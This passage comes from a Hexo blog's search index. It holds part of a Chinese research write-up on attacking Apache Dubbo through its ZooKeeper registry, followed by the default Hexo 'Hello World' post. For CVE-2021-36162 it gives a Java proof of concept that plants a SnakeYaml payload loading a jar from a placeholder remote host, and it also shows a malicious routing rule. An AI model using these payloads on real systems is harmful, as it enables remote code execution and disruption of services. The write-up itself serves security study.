src="/./DUBBO%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-Zookeeper%E7%AF%87/WEBRESOURCEe2c124b9b06fc41903fd95d5ba9eeb91.png"></p><p>添加成功后依旧可以利用成功</p><p><img src="/./DUBBO%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-Zookeeper%E7%AF%87/WEBRESOURCE0721ef3b2ecd3b859654713c420a47ac.png"></p><h3 id="2、CVE-2021-36162"><a href="#2、CVE-2021-36162" class="headerlink" title="2、CVE-2021-36162"></a>2、CVE-2021-36162</h3><p>实验环境dubbo 3.0.0</p><p>这里借鉴文章：<a href="https://mp.weixin.qq.com/s/Lt15gLdE_DYR3Ng2NVrWrg">https://mp.weixin.qq.com/s/Lt15gLdE_DYR3Ng2NVrWrg</a></p><p>此漏洞通过向注册中心注入.migration配置文件进行攻击利用，攻击目标为consumer。</p><p>在consumer调用provider时，会先到注册中心（zk）中dubbo&#x2F;config&#x2F;路径下解析对应consumer的migration配置文件，调用不同版本的provider。注：此处版本为dubbo版本。</p><p>migration配置文件为dubbo 3.x特有功能，dubbo 2.x不具备此功能，为了实现dubbo2向dubbo3平滑迁移引入的功能，查看官方文档（<a href="https://cn.dubbo.apache.org/zh-cn/overview/mannual/java-sdk/upgrades-and-compatibility/service-discovery/migration-service-discovery/%EF%BC%89%EF%BC%8C%E5%8F%AF%E7%9F%A5%E6%AD%A4%E5%8A%9F%E8%83%BD%E6%98%AF%E9%BB%98%E8%AE%A4%E5%90%AF%E7%94%A8%E7%9A%84%EF%BC%8C%E6%89%80%E4%BB%A5%E9%99%8D%E4%BD%8E%E4%BA%86%E5%88%A9%E7%94%A8%E9%9A%BE%E5%BA%A6%EF%BC%8C%E5%8F%AA%E9%9C%80%E8%A6%81%E6%88%91%E4%BB%AC%E7%9B%B4%E6%8E%A5%E5%BE%80zk%E7%9A%84%E5%AF%B9%E5%BA%94%E7%9B%AE%E5%BD%95%E4%B8%8B%E6%B3%A8%E5%86%8C%E6%88%91%E4%BB%AC%E7%9A%84%E6%81%B6%E6%84%8Fpayload%E5%8D%B3%E5%8F%AF%E3%80%82">https://cn.dubbo.apache.org/zh-cn/overview/mannual/java-sdk/upgrades-and-compatibility/service-discovery/migration-service-discovery/），可知此功能是默认启用的，所以降低了利用难度，只需要我们直接往zk的对应目录下注册我们的恶意payload即可。</a></p><p><img src="/./DUBBO%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6-Zookeeper%E7%AF%87/WEBRESOURCE7b71e25842446c51670ebd702fda5995.png"></p><p>漏洞触发点:</p><p>org.apache.dubbo.rpc.cluster.support.migration</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MigrationRule</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DUBBO_SERVICEDISCOVERY_MIGRATION_KEY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dubbo.application.service-discovery.migration&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DUBBO_SERVICEDISCOVERY_MIGRATION_GROUP</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;MIGRATION&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">RULE_KEY</span> <span class="hljs-operator">=</span> ApplicationModel.getName() + <span class="hljs-string">&quot;.migration&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">DynamicConfiguration</span> <span class="hljs-variable">configuration</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">private</span> String key;    <br>    <span class="hljs-keyword">private</span> MigrationStep step;<br>        ...    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> MigrationRule <span class="hljs-title function_">parse</span><span class="hljs-params">(String rawRule)</span> &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == configuration) &#123;<br>                        <span class="hljs-keyword">return</span> getMigrationRule((String)<span class="hljs-literal">null</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!StringUtils.isBlank(rawRule) &amp;&amp; !<span class="hljs-string">&quot;INIT&quot;</span>.equals(rawRule)) &#123;<br>                        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Constructor</span>(MigrationRule.class);            <br>                        <span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>(constructor); <br>                        <span class="hljs-keyword">return</span> (MigrationRule)yaml.load(rawRule);        <br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">step</span> <span class="hljs-operator">=</span> (String)configuration.getInternalProperty(<span class="hljs-string">&quot;dubbo.application.service-discovery.migration&quot;</span>);<br>                        <span class="hljs-keyword">return</span> getMigrationRule(step);<br>            &#125;    <br>     &#125;    <br>         ...<br>&#125;<br></code></pre></td></tr></table></figure><p>但是目前dubbo 3.0.0版本查看源码的时候漏洞触发点官方已经修复了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> MigrationRule <span class="hljs-title function_">parse</span><span class="hljs-params">(String rawRule)</span> &#123;<br>    <span class="hljs-type">Yaml</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Yaml</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SafeConstructor</span>());<span class="hljs-comment">//这里用了安全的方法，无法使其解析我们的恶意yaml</span><br>    Map&lt;String, Object&gt; map = (Map)yaml.load(rawRule);<br>    <span class="hljs-keyword">return</span> parseFromMap(map);<br>&#125;<br></code></pre></td></tr></table></figure><p>此配置要求consumer升级到dubbo 3才可以（dubbo 2 consumer里面根本没办法配置迁移配置文件），所以本环境便无法利用，但是整个思路还是值得借鉴的。</p><p>首先向zk里注册恶意配置文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java">papackage com.example.dubbo.payload;<br><br><span class="hljs-keyword">import</span> org.apache.curator.RetryPolicy;<br><span class="hljs-keyword">import</span> org.apache.curator.framework.CuratorFramework;<br><span class="hljs-keyword">import</span> org.apache.curator.framework.CuratorFrameworkFactory;<br><span class="hljs-keyword">import</span> org.apache.curator.retry.ExponentialBackoffRetry;<br><span class="hljs-keyword">import</span> org.apache.zookeeper.data.Stat;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RegisterYaml</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/dubbo/config/DUBBO_SERVICEDISCOVERY_MIGRATION/consumer.migration&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\&quot;http://IP:PORT/yaml-payload.jar\&quot;]]]]\n&quot;</span>;<br><br>        <span class="hljs-type">RetryPolicy</span> <span class="hljs-variable">retryPolicy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExponentialBackoffRetry</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">3</span>);<br>        <span class="hljs-type">CuratorFramework</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> CuratorFrameworkFactory.newClient(<span class="hljs-string">&quot;192.168.10.5:2181&quot;</span>, retryPolicy);<br>        client.start();<br><br>        <span class="hljs-type">Stat</span> <span class="hljs-variable">stat</span> <span class="hljs-operator">=</span> client.checkExists().forPath(path);<br><br>        <span class="hljs-keyword">if</span> (stat != <span class="hljs-literal">null</span>) &#123;<br>            client.delete().forPath(path);<br>        &#125;<br><br>        client.create().forPath(path, poc.getBytes());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>为什么向“&#x2F;dubbo&#x2F;config&#x2F;DUBBO_SERVICEDISCOVERY_MIGRATION&#x2F;consumer.migration”这个路径注册呢</p><p>在官方文档中（<a href="https://cn.dubbo.apache.org/zh-cn/overview/mannual/java-sdk/upgrades-and-compatibility/service-discovery/service-discovery-samples/%EF%BC%89%EF%BC%8C%E8%A7%84%E5%AE%9A%E8%B7%AF%E5%BE%84%E7%9A%84%E6%A0%BC%E5%BC%8F%E4%B8%BA%EF%BC%9A%E2%80%9CKey">https://cn.dubbo.apache.org/zh-cn/overview/mannual/java-sdk/upgrades-and-compatibility/service-discovery/service-discovery-samples/），规定路径的格式为：“Key</a> 为应用名 + .migration （如 demo-application.migraion），Group 为DUBBO_SERVICEDISCOVERY_MIGRATION”。</p><p>从上面的漏洞触发点可以看出此漏洞利用的是通用漏洞SnakeYaml解析漏洞进行攻击，所以尝试注入的poc为一段yaml文本。</p><p>其次需要准备触发所需的 SPI 配置文件，以及待执行的 jar包。这里可以直接使用开源的脚本（<a href="https://github.com/artsploit/yaml-payload%EF%BC%89%EF%BC%8C%E7%94%9F%E6%88%90%E6%81%B6%E6%84%8Fjar%E5%8C%85%E5%90%8E%E6%8C%89%E7%85%A7%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E4%BD%BF%E7%94%A8python%E6%90%AD%E5%BB%BAHTTP">https://github.com/artsploit/yaml-payload），生成恶意jar包后按照目录结构使用python搭建HTTP</a> Server。</p><p>先启动服务端代码，再运行消费者代码，即可触发漏洞。（因为自己没有环境所以便没有真正利用成功，在yaml.load()处报了错）</p><p>总结：实质上就是找到了一处snakeyaml的漏洞sink点，然后解决这两个问题：</p><ol><li><p>在 ZK 哪个节点中添加恶意 yaml 数据 ？</p></li><li><p>如何让消费者读取并解析这个 yaml 数据 ？</p></li></ol><p>即可利用成功。</p><h3 id="3、错误路由"><a href="#3、错误路由" class="headerlink" title="3、错误路由"></a>3、错误路由</h3><p>此种风险无法达到远程命令执行的目的，但是在内网中，一旦业务被错误路由将会导致业务运行错误或中断。</p><p>Dubbo路由分为：条件路由（默认配置即可实现）、标签路由（此种方式必须修改provider或者consumer配置文件实现）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">RegistryFactory</span> <span class="hljs-variable">registryFactory</span> <span class="hljs-operator">=</span> ExtensionLoader.getExtensionLoader(RegistryFactory.class).getAdaptiveExtension();<br><span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> registryFactory.getRegistry(URL.valueOf(<span class="hljs-string">&quot;zookeeper://0.0.0.0:2181&quot;</span>));<br>registry.register(URL.valueOf(<span class="hljs-string">&quot;conditions://0.0.0.0/com.foo.BarService?category=routers&amp;dynamic=false&amp;rule=&quot;</span><br>            + URL.encode(<span class="hljs-string">&quot;host = 10.20.153.10 =&gt; host = 10.20.153.11&quot;</span>)));<br></code></pre></td></tr></table></figure><p>第一个host：匹配consumer的条件</p><p>第二个host：匹配provider的条件</p>]]></content>
    
    
    
    <tags>
      
      <tag>云安全</tag>
      
      <tag>Dubbo</tag>
      
      <tag>应用安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/03/22/hello-world/"/>
    <url>/2023/03/22/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
